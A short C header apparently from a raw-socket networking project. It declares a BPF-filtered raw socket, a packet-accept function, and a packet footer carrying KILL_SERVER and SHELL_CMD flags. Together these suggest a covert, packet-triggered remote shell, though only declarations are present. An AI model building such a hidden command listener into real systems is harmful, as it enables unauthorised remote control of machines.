#ifndef NETWORKING_H
#define NETWORKING_H

#include <stdint.h>

#define EXIT_KILL_SERVER (-1)
#define KILL_SERVER (0x01)
#define SHELL_CMD (0x02)

typedef struct __attribute__((packed)) footer
{
    uint8_t flag;
    uint32_t cmd_len;
} footer_t;

/**
 * @brief Create a raw filter socket with the given BPF program.
 *
 * @param bpf Pointer to the BPF program to attach to the socket.
 * @return int The file descriptor of the created socket, or -1 on failure.
 */
int CreateRawFilterSocket(struct sock_fprog* bpf);

/**
 * @brief Accept a packet from the raw socket.
 *
 * @param raw_sock The file descriptor of the raw socket.
 * @param packet_data A double pointer to store the received packet data.
 * @return int EXIT_SUCCESS on success, EXIT_FAILURE on failure.
 */
int AcceptPacket(int raw_sock, unsigned char** packet_data);

#endif /*NETWORKING_H*/